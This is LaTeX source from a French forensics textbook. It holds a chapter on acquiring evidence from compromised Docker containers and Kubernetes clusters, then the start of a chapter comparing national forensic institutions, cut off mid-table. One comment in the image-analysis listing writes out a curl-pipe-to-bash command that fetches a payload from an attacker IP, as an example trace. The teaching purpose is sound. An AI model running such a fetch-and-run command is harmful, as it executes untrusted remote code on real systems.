\niveauChapitre{Expert}{%
    Notions de Docker et Kubernetes requises. Chapitre~\ref{chap:for-cloud}
    (forensique cloud IaaS) indispensable~: ce chapitre descend d'un
    niveau d'abstraction supplémentaire.%
}

\begin{boxobjectifs}
\begin{itemize}
    \item Comprendre l'architecture conteneurs~/~orchestrateur et
          identifier où résident les données forensiques à chaque couche.
    \item Acquérir l'état d'un conteneur Docker compromis avant
          sa destruction~: système de fichiers, processus, réseau.
    \item Analyser les journaux et événements Kubernetes pour
          reconstituer une chronologie d'attaque cloud-native.
    \item Gérer l'éphéméralité extrême des conteneurs~: stratégies
          de capture en environnement de production.
    \item Identifier les vecteurs d'attaque spécifiques aux
          conteneurs~: évasion, images compromises, secrets exposés.
    \item Documenter une investigation cloud-native dans le respect
          des principes de custody adaptés à cet environnement.
\end{itemize}
\end{boxobjectifs}

\bigskip

% ============================================================================
\section*{Pourquoi un chapitre dédié aux conteneurs}
% ============================================================================

Le Chapitre~\ref{chap:for-cloud} a traité la forensique cloud au niveau
de la machine virtuelle~: CloudTrail enregistre qui a lancé une instance
EC2, un snapshot EBS préserve son disque. Mais l'architecture moderne
des applications cloud ne s'arrête pas aux VMs~: à l'intérieur de
chaque VM tournent désormais des dizaines, parfois des centaines de
\textbf{conteneurs}, des unités d'exécution légères, créées et
détruites en quelques secondes, orchestrées par des systèmes comme
\termecle{Kubernetes}\index{Kubernetes}.

Cette architecture pousse l'éphéméralité (déjà identifiée au
Ch.~\ref{chap:for-cloud} comme défi central du cloud) à son extrême~:
un conteneur compromis peut être détruit par l'orchestrateur lui-même (pour cause de redémarrage automatique, de mise à l'échelle, ou
de politique de sécurité) avant que l'investigateur n'ait eu le
temps d'intervenir.

\separateur

% ============================================================================
\section{Architecture Conteneurs~: où Résident les Données}
\label{sec:architecture-conteneurs}
% ============================================================================

\subsection{Les couches d'abstraction}

\begin{tableaucours}{p{2.8cm}p{3.5cm}p{5.5cm}}{%
    \tableauHeader{Couche} &
    \tableauHeader{Durée de vie typique} &
    \tableauHeader{Données forensiques}
}
\textbf{Image} (Docker Image) & Persistante (registre) &
    Code applicatif, dépendances, configuration~; analysable
    hors-ligne comme un firmware (Ch.~\ref{chap:for-iot}) \\
\textbf{Conteneur} (instance d'exécution) & Secondes à jours &
    Processus actifs, système de fichiers en écriture
    (\textit{layer} superposé), variables d'environnement \\
\textbf{Pod} (Kubernetes~: groupe de conteneurs) & Minutes à mois &
    Logs agrégés, réseau interne au Pod, volumes partagés \\
\textbf{N\oe ud} (machine hébergeant les Pods) & Heures à années &
    Logs systemd/journald (Ch.~\ref{chap:for-sys}), logs kubelet,
    images Docker en cache \\
\textbf{Cluster} (orchestrateur complet) & Persistant &
    \texttt{etcd} (base de données d'état)~; audit logs API
    Kubernetes~; configuration RBAC \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~24.1. Couches d'abstraction et données forensiques}\end{center}

\subsection{Le défi de l'éphéméralité extrême}

\begin{boxCRO}
\textbf{Analyse CRO. Éphéméralité des conteneurs}

$\mathcal{R}$ (Fiabilité)~: capturer l'état exact d'un conteneur
en cours d'exécution avant sa destruction nécessite une réaction
en quelques secondes à minutes. Un conteneur Kubernetes peut être
détruit automatiquement par une politique de \textit{liveness probe}
(redémarrage si le processus principal échoue) sans intervention
humaine.

$\mathcal{O}$ (Opposabilité)~: l'absence de preuve directe (le
conteneur a disparu) ne signifie pas l'absence d'incident, mais
elle complique significativement la démonstration. Les logs
externalisés (Section~\ref{sec:logs-k8s}) deviennent la source
probatoire principale.

$\mathcal{C}$ (Confidentialité)~: un cluster Kubernetes multi-tenant
héberge souvent les charges de travail de plusieurs clients sur
la même infrastructure physique, l'investigation d'un Pod doit
être rigoureusement cantonnée à son périmètre (\textit{namespace}).

\cro{$\downarrow$ cantonnement namespace}{$\downarrow\downarrow$ disparition rapide}{$\sim$ dépend des logs externalisés}

\textbf{Conséquence opérationnelle~:} contrairement aux Ch.~14--18
où l'acquisition pouvait souvent attendre quelques heures, la
forensique conteneur exige une \textbf{architecture de détection
et réponse automatisée} (Section~\ref{sec:strategie-capture})
mise en place \emph{avant} l'incident.
\end{boxCRO}

% ============================================================================
\section{Acquisition d'un Conteneur Docker Compromis}
\label{sec:acquisition-docker}
% ============================================================================

\subsection{Capture de l'état d'un conteneur en cours d'exécution}

\begin{boxoutils}{Acquisition forensique d'un conteneur Docker actif}
\begin{lstlisting}[language=bash_forensique]
# PRINCIPE : agir vite, dans l'ordre de volatilite (RFC 3227
# adapte aux conteneurs, cf. Ch. 21 pour la logique generale)

# Etape 1 : identifier le conteneur suspect
docker ps
# CONTAINER ID   IMAGE          STATUS         NAMES
# a3f7b29c8e1d   webapp:latest  Up 47 minutes  prod-webapp-3

# Etape 2 : capturer les processus actifs DANS le conteneur
docker top a3f7b29c8e1d -eo pid,ppid,cmd,etime
# Revele les processus en cours -- equivalent du Volatility
# pslist (Ch. 14) mais a l'echelle du conteneur

# Etape 3 : capturer les connexions reseau du conteneur
docker exec a3f7b29c8e1d cat /proc/net/tcp
# Ou, depuis l'hote (sans modifier le conteneur) :
nsenter -t $(docker inspect -f '{{.State.Pid}}' a3f7b29c8e1d) \
    -n netstat -tupln

# Etape 4 : capturer les logs du conteneur (stdout/stderr)
docker logs a3f7b29c8e1d --timestamps > /output/container_logs.txt

# Etape 5 : capturer le diff du systeme de fichiers
# (ce qui a ete modifie par rapport a l'image d'origine)
docker diff a3f7b29c8e1d > /output/container_fs_diff.txt
# Resultat type :
# A /tmp/malware.sh        <- fichier Ajoute
# C /etc/passwd            <- fichier Change
# D /var/log/auth.log      <- fichier Detruit (anti-forensique !)

# Etape 6 : exporter le systeme de fichiers complet du conteneur
docker export a3f7b29c8e1d -o /output/container_export.tar
sha256sum /output/container_export.tar > /output/container_hash.txt

# Etape 7 : capturer l'image source pour comparaison
docker save webapp:latest -o /output/image_source.tar
# Comparer image_source (etat propre) avec container_export
# (etat compromis) pour isoler precisement les modifications

# Etape 8 : SEULEMENT APRES capture complete -- arreter le conteneur
# (preserve l'etat pour investigation differee si necessaire)
docker pause a3f7b29c8e1d   # gele sans detruire
# docker stop -- a eviter en premier reflexe : declenche parfois
# des hooks de nettoyage (anti-forensique involontaire)
\end{lstlisting}
\end{boxoutils}

\begin{boxalert}
\textbf{\texttt{docker diff}~: l'outil le plus sous-utilisé en
forensique conteneur}

La commande \texttt{docker diff} révèle en une seconde tous les
fichiers ajoutés, modifiés ou supprimés par rapport à l'image
d'origine immuable. C'est l'équivalent conteneur du \texttt{\$UsnJrnl}
(Ch.~\ref{chap:for-sys})~: elle révèle non seulement l'activité
malveillante mais aussi les \textbf{tentatives de suppression
de logs internes} au conteneur (marquées \texttt{D} dans la sortie).
Toujours exécuter cette commande \textbf{avant} tout arrêt du conteneur.
\end{boxalert}

\subsection{Capture mémoire d'un conteneur}

\begin{boxoutils}{Capture mémoire d'un processus conteneurisé}
\begin{lstlisting}[language=bash_forensique]
# Un conteneur partage le noyau de l'hote -- pas d'hyperviseur
# separe comme pour une VM. La capture memoire cible le ou les
# processus du conteneur depuis l'hote.

# Identifier le PID hote correspondant au conteneur
CONTAINER_PID=$(docker inspect -f '{{.State.Pid}}' a3f7b29c8e1d)
echo $CONTAINER_PID
# 48291

# Capturer la memoire du processus (sur l'hote, avec privileges)
gcore -o /output/container_memory $CONTAINER_PID
# Genere /output/container_memory.48291

# Analyse avec Volatility 3 (meme outil que Ch. 14, profil Linux)
python3 vol.py -f /output/container_memory.48291 \
    linux.bash    # historique bash si shell actif dans le conteneur
python3 vol.py -f /output/container_memory.48291 \
    linux.pslist  # processus enfants du processus principal

# Alternative : capture de la memoire complete de l'hote
# (capture TOUS les conteneurs, plus lourd mais plus complet)
# -- utiliser LiME (Linux Memory Extractor) comme au Ch. 14
# pour les systemes Linux
\end{lstlisting}
\end{boxoutils}

% ============================================================================
\section{Logs et Événements Kubernetes}
\label{sec:logs-k8s}
% ============================================================================

\subsection{Architecture de logging Kubernetes}

\begin{tableaucours}{p{3.0cm}p{4.0cm}p{4.5cm}}{%
    \tableauHeader{Source} &
    \tableauHeader{Contenu} &
    \tableauHeader{Rétention typique}
}
\textbf{API Server Audit Log} & Chaque appel à l'API Kubernetes~:
    qui, quoi, quand &
    Selon configuration (souvent~7--30~jours)~; \textbf{le plus
    important pour la forensique} \\
\textbf{Kubelet logs} & Activité du nœud~: démarrage/arrêt de Pods &
    Logs systemd locaux (Ch.~\ref{chap:for-sys})~; rotation rapide \\
\textbf{Pod logs} & \texttt{stdout}/\texttt{stderr} de l'application &
    Perdus à la suppression du Pod sauf agrégation externe
    (ELK, Loki) \\
\textbf{etcd} & État complet du cluster (configuration, secrets) &
    Persistant tant que le cluster existe~; snapshot recommandé \\
\textbf{Events} (\texttt{kubectl get events}) & Événements du cycle
    de vie (création, échec, redémarrage) &
    \textbf{1~heure par défaut}, extrêmement volatile \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~24.2. Sources de logs Kubernetes}\end{center}

\begin{boxoutils}{Extraction de l'audit log Kubernetes API Server}
\begin{lstlisting}[language=bash_forensique]
# Format de l'Audit Log Kubernetes (JSON Lines)
# Localisation typique : /var/log/kubernetes/audit.log
# (ou exporte vers un SIEM -- cf. principe de forwarding, Ch. 21)

# Filtrer les actions sur un namespace specifique
cat audit.log | jq 'select(.objectRef.namespace == "production")'

# Identifier qui a cree/modifie/supprime des ressources
cat audit.log | jq -r 'select(.verb == "create" or .verb ==
    "delete") | [.requestReceivedTimestamp, .verb,
    .objectRef.resource, .objectRef.name,
    .user.username, .sourceIPs[0]] | @csv'

# Detecter l'execution de commandes dans un Pod (kubectl exec)
# -- vecteur d'attaque frequent une fois un acces initial obtenu
cat audit.log | jq 'select(.objectRef.subresource == "exec")'
# Resultat type :
# {
#   "verb": "create",
#   "objectRef": {"resource": "pods", "name": "prod-webapp-3",
#                  "subresource": "exec"},
#   "user": {"username": "system:serviceaccount:default:ci-cd"},
#   "requestReceivedTimestamp": "2026-03-13T02:17:30Z"
# }
# -- un compte de service CI/CD executant un kubectl exec
#    en pleine nuit est hautement suspect

# Detecter la creation de Pods avec privileges eleves
# (vecteur d'evasion de conteneur frequent)
cat audit.log | jq 'select(.verb == "create" and
    .objectRef.resource == "pods") |
    select(.requestObject.spec.containers[].securityContext.privileged
    == true)'
\end{lstlisting}
\end{boxoutils}

\begin{boxscenario}{Reconstitution d'une attaque Kubernetes, cas MVOM étendu}
Extension de l'affaire MVOM (Ch.~\ref{chap:for-cloud})~: TRANSBOIS~SA
utilisait en réalité un cluster Kubernetes pour héberger ses applications.
L'audit log API Server révèle~:

\begin{lstlisting}[language=bash_forensique]
02:14:09  CREATE  pods/exec  prod-webapp-3  user:ci-cd-sa
          IP:185.220.XX.XX
02:14:15  CREATE  pods/exec  prod-webapp-3  user:ci-cd-sa
          subresource:exec  command:["/bin/sh"]
02:16:50  UPDATE  pods/prod-webapp-3  user:ci-cd-sa
          (modification de fichiers via exec, pas de trace
           directe dans audit log -- voir docker diff)
02:19:45  DELETE  pods/prod-webapp-3  user:system:kube-scheduler
          reason:Evicted (le pod a ete automatiquement detruit
          par l'orchestrateur suite a une alerte ressources)
\end{lstlisting}

\textbf{Constatation~:} l'audit log API Server enregistre une
création de session \texttt{exec} sur le Pod \texttt{prod-webapp-3}
à 02h14:15, initiée par le compte de service \texttt{ci-cd-sa}
depuis l'IP \texttt{185.220.XX.XX}.\\[0.3ex]
\textbf{Analyse~:} la destruction automatique du Pod à 02h19:45
(raison~: \texttt{Evicted}, déclenchée par l'orchestrateur
lui-même et non par l'attaquant) illustre la fragilité probatoire
spécifique aux environnements cloud-native~: \textbf{le système
a lui-même détruit la preuve principale} (le conteneur compromis)
dans le cadre de son fonctionnement normal, 5~minutes et~30~secondes
après l'intrusion. Seul l'audit log API Server, externalisé
vers un SIEM distinct du cluster, a permis de reconstituer
cette chronologie.
\end{boxscenario}

% ============================================================================
\section{Vecteurs d'Attaque Spécifiques aux Conteneurs}
\label{sec:vecteurs-attaque}
% ============================================================================

\subsection{Images compromises}

\begin{tableaucours}{p{3.5cm}p{4.0cm}p{4.5cm}}{%
    \tableauHeader{Vecteur} &
    \tableauHeader{Mécanisme} &
    \tableauHeader{Trace forensique}
}
\textbf{Image malveillante} & Image publique sur Docker~Hub
    contenant un payload caché &
    Hash de l'image~; comparaison avec le registre officiel~;
    \texttt{docker history} pour voir les couches \\
\textbf{Dépendance compromise} & Bibliothèque tierce incluse
    dans l'image (\textit{supply chain attack}) &
    Analyse du \texttt{Dockerfile}~/ \texttt{requirements.txt}~;
    scan de vulnérabilités (Trivy, Grype) \\
\textbf{Secrets exposés} & Clés API, mots de passe codés en dur
    dans l'image &
    \texttt{docker history --no-trunc}~; scan avec
    \texttt{trufflehog} ou \texttt{gitleaks} \\
\textbf{Évasion de conteneur} & Exploitation d'une vulnérabilité
    pour sortir du conteneur vers l'hôte &
    Logs kernel (\texttt{dmesg})~; alertes runtime
    (Falco)~; processus inattendus sur l'hôte \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~24.3. Vecteurs d'attaque conteneurs et traces forensiques}\end{center}

\begin{boxoutils}{Analyse forensique d'une image Docker suspecte}
\begin{lstlisting}[language=bash_forensique]
# Examiner l'historique des couches de l'image (sans l'executer)
docker history --no-trunc webapp:latest
# Revele chaque commande RUN/COPY/ADD ayant construit l'image
# -- une commande "RUN curl http://185.220.XX.XX/payload.sh |
#    bash" serait visible ici

# Extraire et analyser le contenu de l'image (comme un firmware,
# cf. Ch. 18 -- meme logique avec Binwalk)
docker save webapp:latest -o image.tar
tar -xf image.tar -C /output/image_extracted/
# Chaque couche est un fichier layer.tar -- extraire et analyser

# Scanner les vulnerabilites connues (CVE)
trivy image webapp:latest
# Resultat type :
# webapp:latest (alpine 3.18)
# Total: 14 (HIGH: 3, CRITICAL: 1)
# CVE-2024-XXXX  openssl  CRITICAL  Remote Code Execution

# Rechercher des secrets codes en dur
trufflehog docker --image webapp:latest
# Detecte : cles AWS, tokens API, mots de passe en clair dans
# les couches de l'image (meme si supprimes dans une couche
# ulterieure -- ils restent dans l'historique des couches !)

# Comparer le hash de l'image avec le registre officiel
docker inspect webapp:latest --format='{{.Id}}'
# Comparer avec le digest publie sur Docker Hub / registre prive
# Une divergence indique une image modifiee localement
\end{lstlisting}
\end{boxoutils}

\begin{boiteRemarque}{Les secrets supprimés restent dans l'historique des couches}
Une erreur fréquente des développeurs~: ajouter un secret (clé API)
dans une couche Docker, puis le supprimer dans une couche ultérieure
en pensant l'avoir effacé. \textbf{Le secret reste accessible} dans
l'historique des couches de l'image, car Docker conserve chaque
couche indépendamment. C'est un parallèle direct avec le wiping
de fichiers (Ch.~\ref{chap:anti-for})~: la suppression apparente
ne supprime pas la donnée sous-jacente. Cette caractéristique est
à la fois une faille de sécurité courante \emph{et} une opportunité
forensique pour l'investigateur.
\end{boiteRemarque}

% ============================================================================
\section{Stratégie de Capture en Production}
\label{sec:strategie-capture}
% ============================================================================

\subsection{Pourquoi l'acquisition réactive est insuffisante}

Contrairement aux scénarios des Chapitres~\ref{chap:for-sys}
à~\ref{chap:for-iot} où l'investigateur arrive après l'incident avec
le temps de mettre en place une acquisition méthodique, l'éphéméralité
extrême des conteneurs exige une \textbf{architecture préventive}.

\begin{boxPNC}
\textbf{Recommandations architecturales pour la \textit{readiness}
forensique cloud-native}

\begin{enumerate}
    \item \textbf{Externalisation systématique des logs}~: agrégation
          en temps réel (Fluentd, Loki) vers un système distinct
          du cluster, avec rétention minimale de~90~jours.
    \item \textbf{Audit log API Server activé et exporté}~:
          configuration \texttt{Metadata} ou \texttt{RequestResponse}
          (niveau de détail) selon la criticité~; export immédiat
          hors du cluster.
    \item \textbf{Politique d'\textit{eviction} documentée}~: en cas
          d'incident suspecté, désactiver temporairement
          l'\textit{auto-scaling} et les redémarrages automatiques
          pour préserver l'état du conteneur compromis.
    \item \textbf{Runtime security monitoring}~: outils comme
          \textbf{Falco} détectent et alertent en temps réel sur
          les comportements anormaux (exécution de shell inattendue,
          accès fichier sensible), avec capture automatique du
          contexte au moment de l'alerte.
    \item \textbf{Snapshots etcd réguliers}~: préservent l'état
          complet de la configuration du cluster à intervalles
          définis, indépendamment des Pods individuels.
\end{enumerate}
\end{boxPNC}

\subsection{Procédure d'urgence~: les 5 premières minutes}

\begin{boxoutils}{Checklist d'urgence -- incident conteneur détecté}
\begin{lstlisting}[language=bash_forensique]
# MINUTE 0-1 : geler la situation
kubectl label pod prod-webapp-3 quarantine=true
    --namespace=production
# Isoler via NetworkPolicy plutot que supprimer immediatement
kubectl annotate pod prod-webapp-3 forensics.io/preserve=true
# (annotation personnalisee pour signaler aux controllers
#  de ne pas recycler ce pod automatiquement, si configure)

# MINUTE 1-3 : capturer l'etat du conteneur
docker diff <container-id>
docker logs <container-id> --timestamps
docker top <container-id> -eo pid,ppid,cmd

# MINUTE 3-5 : exporter et hasher
docker export <container-id> -o /output/evidence.tar
sha256sum /output/evidence.tar

# APRES : analyse approfondie sans pression temporelle,
# en suivant les procedures des Ch. 14 (systeme) et Ch. 15 (reseau)
# sur les donnees exportees
\end{lstlisting}
\end{boxoutils}

\separateur

% --- Encadré lab NDAP SUKULU ---
\begin{boiteRemarque}{Notions mobilisées par le laboratoire INA-LAB-11}
\begin{itemize}
    \item \textbf{Journal d'audit Kubernetes}~: une session
          \texttt{kubectl exec} apparaît comme un \texttt{create} sur la
          sous-ressource \texttt{pods/exec}~; le compte est dans
          \texttt{user.username}, la commande dans l'URI de la requête
          (\texttt{\%2Fbin\%2Fsh} pour \texttt{/bin/sh}).
    \item \textbf{Destruction par l'orchestrateur}~: un pod peut être
          supprimé par le système lui-même (éviction)~; la raison figure dans
          les \texttt{annotations} de l'événement (\texttt{reason}). La
          preuve volatile disparaît avec le pod~: capturer avant.
    \item \textbf{\texttt{docker diff}}~: il liste, par rapport à l'image,
          les fichiers ajoutés (\texttt{A}), modifiés (\texttt{C}) et
          supprimés (\texttt{D})~; un exécutable ajouté au nom d'un processus
          du noyau, un journal supprimé sont des indices forts.
    \item \textbf{Image substituée}~: l'empreinte (\emph{digest}) de l'image
          en exécution, comparée à celle du registre, révèle une image
          remplacée.
\end{itemize}
\end{boiteRemarque}

\begin{boxresume}
\textbf{Ce qu'il faut retenir de ce chapitre~:}
\begin{itemize}
    \item \textbf{Cinq couches d'abstraction}~: Image (persistante,
          analysable comme un firmware) $\to$ Conteneur (secondes
          à jours) $\to$ Pod $\to$ N\oe ud $\to$ Cluster. Chaque
          couche a ses propres données forensiques.

    \item \textbf{\texttt{docker diff} en premier réflexe}~: révèle
          en une commande tous les fichiers ajoutés, modifiés ou
          supprimés par rapport à l'image d'origine immuable, équivalent conteneur du \texttt{\$UsnJrnl}.

    \item \textbf{L'audit log API Server Kubernetes} est la source
          probatoire la plus importante~: contrairement aux Pod logs
          (perdus à la suppression) et aux Events (rétention~1h),
          il peut être externalisé et conservé durablement.

    \item \textbf{L'orchestrateur peut détruire la preuve lui-même}~:
          \textit{eviction}, \textit{auto-scaling}, redémarrage
          automatique sont des fonctionnements normaux qui
          anéantissent l'état d'un conteneur compromis. C'est
          un défi structurel propre au cloud-native.

    \item \textbf{Les secrets supprimés restent dans l'historique
          des couches Docker}, parallèle direct avec le wiping
          de fichiers (Ch.~\ref{chap:anti-for}). Utiliser
          \texttt{docker history --no-trunc} et des scanners
          de secrets (trufflehog, gitleaks).

    \item \textbf{La \textit{readiness} prime sur la réactivité}~:
          contrairement aux scénarios précédents, l'éphéméralité
          extrême exige une architecture préventive (externalisation
          des logs, runtime monitoring avec Falco, politiques
          d'\textit{eviction} documentées) mise en place
          \emph{avant} l'incident.
\end{itemize}
\end{boxresume}

\bigskip

\begin{boxexo}[title={\ding{45}\quad Exercice~24.1. Identifier les sources \niveaubase}]
Pour chacune des questions suivantes, identifiez la source de
données la plus appropriée (Tableau~24.1 ou~24.2) et la commande
pour l'obtenir~:
\begin{enumerate}[(a)]
    \item Quels fichiers un conteneur a-t-il modifiés par rapport
          à son image d'origine~?
    \item Qui a exécuté une commande \texttt{kubectl exec} sur un
          Pod en production la nuit dernière~?
    \item Un conteneur contient-il des clés API codées en dur,
          même si elles ont été supprimées dans une couche
          ultérieure du Dockerfile~?
    \item Quel processus tournait dans un conteneur juste avant
          sa destruction par l'orchestrateur~?
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~24.2. Analyse de docker diff \niveaumoyen}]
La commande \texttt{docker diff prod-api-7} sur un conteneur
suspecté compromis donne~:
\begin{lstlisting}[language=bash_forensique]
A /tmp/.hidden/backdoor.py
A /tmp/.hidden/requirements_extra.txt
C /etc/crontab
C /app/config.yaml
D /var/log/app/access.log
D /var/log/app/error.log
\end{lstlisting}
\begin{enumerate}[(a)]
    \item Interprétez chaque ligne~: que signifient A, C, D~?
    \item Quelle hypothèse formulez-vous sur l'objectif de
          l'attaquant à partir de la modification de
          \texttt{/etc/crontab}~? Quelle technique du Ch.~18
          (IoT) cela rappelle-t-il~?
    \item Les fichiers \texttt{access.log} et \texttt{error.log}
          ont été supprimés (D). Cette suppression elle-même
          a-t-elle laissé une trace~? Où la chercheriez-vous~?
    \item Rédigez les 3~premières constatations de votre rapport
          à partir de ce \texttt{docker diff}, en respectant
          la structure du Ch.~\ref{chap:rapport}.
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~24.3. Incident Kubernetes complet \niveauexpert}]
Une startup camerounaise de paiement mobile (architecture
Kubernetes sur infrastructure cloud) signale une activité suspecte~:
un Pod traitant les transactions a présenté un pic de trafic réseau
sortant anormal pendant 8~minutes avant d'être automatiquement
redémarré par une \textit{liveness probe} ayant échoué. Le Pod
redémarré est ``propre'', aucune trace de compromission visible
dans son état actuel.
\begin{enumerate}[(a)]
    \item Le Pod compromis original a disparu. Quelles sources
          de données restent disponibles pour l'investigation~?
          Classez-les par fiabilité et disponibilité probable.
    \item Quelles requêtes \texttt{jq} sur l'audit log API Server
          formuleriez-vous pour reconstituer l'activité sur ce
          Pod dans la fenêtre de~8~minutes~?
    \item L'entreprise n'avait pas externalisé ses Pod logs
          (perdus à la destruction). Quelle recommandation
          architecturale (Section~\ref{sec:strategie-capture})
          auriez-vous formulée \emph{avant} cet incident pour
          éviter cette perte~?
    \item Cette affaire implique des données financières de
          clients camerounais (Mobile Money). Quelles obligations
          de la \loicam{2024/017}~\cite{cameroun2024donnees} (Ch.~12~(UE~SEC4031))
          s'appliquent à cette startup concernant la notification
          de l'incident~?
    \item Rédigez la Synthèse Exécutive (Niveau~1, Ch.~\ref{chap:rapport})
          de cette investigation, en assumant honnêtement les
          limites probatoires dues à la perte du Pod original.
\end{enumerate}
\end{boxexo}

\bigskip

\begin{boxinfo}
\textbf{Transition.} La forensique cloud-native montre que la
capacité d'investigation dépend autant de l'organisation que de
la technique~: externalisation des journaux, procédures, préparation.
Le chapitre suivant élargit ce constat à l'échelle des États~: comment
les systèmes nationaux d'investigation numérique se sont-ils construits,
et que peut en retenir le Cameroun~?
\end{boxinfo}
    
        % ============================================================================
% Fichier  : partie5/P05_C25_benchmarking.tex
% Titre    : Benchmarking Mondial des Pratiques Forensiques
% Auteur   : MINKA MI NGUIDJOÏ Thierry Emmanuel
% Version  : 1.0 -- Juin 2026
% ============================================================================

\chapter{Benchmarking Mondial des Pratiques Forensiques}
\label{chap:bench}

\epigraph{%
    « L'excellence s'atteint non pas en imitant, mais en comprenant,
    adaptant et dépassant les meilleures pratiques mondiales. »%
}{Malcolm Gladwell}

\niveauChapitre{Expert}{%
    Vision globale du cours requise. Ce chapitre suppose la
    maîtrise du Chapitre~7~(UE~SEC4031) (standards ISO/NIST/ACPO~\cite{acpo2012})
    et du Chapitre~10~(UE~SEC4031) (cadre normatif global)~:
    il les replace dans une perspective institutionnelle comparative.%
}

\begin{boxobjectifs}
\begin{itemize}
    \item Comparer l'organisation institutionnelle de la forensique
          numérique dans plusieurs juridictions de référence.
    \item Identifier les facteurs structurels qui expliquent les
          écarts de maturité forensique entre pays.
    \item Distinguer ce qui est transposable au contexte camerounais
          de ce qui ne l'est pas, et pourquoi.
    \item Analyser le rôle des laboratoires forensiques nationaux
          et des modèles de certification d'experts.
    \item Formuler des recommandations réalistes pour le développement
          de la capacité forensique camerounaise, ancrées dans
          les contraintes réelles du pays.
    \item Adopter une posture critique face aux discours de
          ``rattrapage technologique'' non étayés.
\end{itemize}
\end{boxobjectifs}

\bigskip

% ============================================================================
\section*{Avertissement méthodologique}
% ============================================================================

Le benchmarking institutionnel international est un exercice délicat~:
les données chiffrées précises sur les capacités forensiques nationales
(budgets, effectifs, taux de résolution) sont rarement publiées par les
agences elles-mêmes, pour des raisons de sécurité opérationnelle.
Ce chapitre s'appuie donc sur des \textbf{informations publiquement
documentées et vérifiables}~: organisation institutionnelle, cadres
juridiques publiés, accréditations professionnelles, standards
adoptés. Il \textbf{évite délibérément} les classements numériques
précis (``score~9.13/10'') qui donneraient une fausse impression
de précision scientifique à des comparaisons par nature qualitatives.

\separateur

% ============================================================================
\section{Cadre d'Analyse Comparative}
\label{sec:cadre-analyse}
% ============================================================================

\subsection{Pourquoi comparer les systèmes nationaux}

L'objectif de ce chapitre n'est pas le classement mais la
\textbf{compréhension structurelle}~: pourquoi certains pays ont-ils
développé des capacités forensiques matures plus tôt~? Quels facteurs
institutionnels expliquent ces différences~? Lesquels sont transposables
au Cameroun, et à quel horizon temporel réaliste~?

\subsection{Dimensions d'analyse}

\begin{tableaucours}{p{3.0cm}p{8.5cm}}{%
    \tableauHeader{Dimension} &
    \tableauHeader{Question posée}
}
\textbf{Cadre légal} & Existe-t-il une loi spécifique à la
    cybercriminalité~? Depuis quand~? A-t-elle été révisée pour
    suivre l'évolution technologique~? \\
\textbf{Organisation institutionnelle} & Y a-t-il un laboratoire
    forensique national centralisé, ou une capacité distribuée~?
    Quel rattachement administratif (police, justice, agence
    indépendante)~? \\
\textbf{Certification professionnelle} & Existe-t-il un cursus de
    certification reconnu pour les experts forensiques~? Qui
    l'administre~? Est-il obligatoire pour témoigner~? \\
\textbf{Coopération internationale} & Le pays est-il partie à des
    conventions internationales (Budapest, Malabo)~? Dispose-t-il
    d'un point de contact 24/7 opérationnel~? \\
\textbf{Recherche et formation} & Existe-t-il des programmes
    universitaires dédiés~? Une production scientifique nationale
    en forensique numérique~? \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~25.1. Dimensions d'analyse comparative}\end{center}

% ============================================================================
\section{États-Unis~: le Modèle de la Spécialisation Fédérale}
\label{sec:benchmark-usa}
% ============================================================================

\subsection{Organisation institutionnelle}

Les États-Unis se distinguent par une architecture fédérale
fragmentée mais hautement spécialisée. Le FBI dispose de
\textbf{Regional Computer Forensics Laboratories} (RCFL),
un réseau de laboratoires régionaux créé en~1999, qui fournit un
support forensique mutualisé aux agences locales, étatiques
et fédérales. Cette mutualisation permet des investissements
en équipement de pointe inaccessibles à une agence locale isolée.

\begin{tableaucours}{p{3.2cm}p{8.0cm}}{%
    \tableauHeader{Élément} &
    \tableauHeader{Caractéristique}
}
Cadre légal & \textit{Computer Fraud and Abuse Act} (1986, révisé
    plusieurs fois)~; \textit{Stored Communications Act} (1986)~;
    cf. Ch.~11~(UE~SEC4031) \\
Certification & \textit{IACIS} (\textit{International Association
    of Computer Investigative Specialists})~: certification CFCE
    reconnue, examen pratique rigoureux \\
Recherche & NIST publie et maintient activement les standards
    (SP~800-86, NIST~CFTT pour la validation d'outils)~; recherche
    académique abondante \\
Limite structurelle & Fragmentation entre 50~États~+ niveau
    fédéral~: hétérogénéité des pratiques locales malgré
    l'excellence des standards fédéraux \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~25.2. États-Unis~: organisation forensique}\end{center}

\subsection{Ce qui explique la maturité américaine}

Trois facteurs structurels, documentés et vérifiables~: (1)~un
investissement public soutenu dans la recherche (NIST) depuis les
années~1990~; (2)~une industrie privée de cybersécurité considérable
qui alimente en outils, en formation et en personnel qualifié les
agences publiques~; (3)~un volume d'affaires si important qu'il a
justifié très tôt la spécialisation et la standardisation.

\begin{boiteRemarque}{Une limite souvent ignorée}
La maturité technique américaine ne se traduit pas uniformément
en qualité de justice~: le nombre de condamnations annulées pour
vices de procédure forensique (\textit{Daubert challenges} sur
la fiabilité méthodologique) reste significatif. La sophistication
technique n'élimine pas le risque d'erreur procédurale, elle
le déplace simplement vers des domaines plus subtils.
\end{boiteRemarque}

% ============================================================================
\section{Royaume-Uni~: le Modèle de la Rigueur Procédurale}
\label{sec:benchmark-uk}
% ============================================================================

\subsection{ACPO et l'héritage procédural}

Le Royaume-Uni a développé, via l'\textit{Association of Chief
Police Officers} (ACPO), le cadre procédural le plus influent au
monde en matière de forensique numérique~: les quatre principes
ACPO (Ch.~7~(UE~SEC4031)) sont aujourd'hui cités et adoptés
bien au-delà du Royaume-Uni, y compris dans des pays sans lien
historique avec le système juridique britannique.

\begin{tableaucours}{p{3.2cm}p{8.0cm}}{%
    \tableauHeader{Élément} &
    \tableauHeader{Caractéristique}
}
Cadre légal & \textit{Computer Misuse Act}~1990 (l'une des
    premières lois cyber au monde)~; \textit{Investigatory
    Powers Act}~2016 \\
Organisation & \textit{National Crime Agency} (NCA), unité
    nationale dédiée à la cybercriminalité, créée en~2013,
    centralise les capacités sur les affaires complexes \\
Certification & Pas de certification professionnelle unique
    obligatoire~; accréditation des laboratoires via
    \textit{UKAS} (ISO/IEC~17025~\cite{iso17025_2017}) \\
Spécificité & Forte culture de la \textbf{transparence procédurale}~:
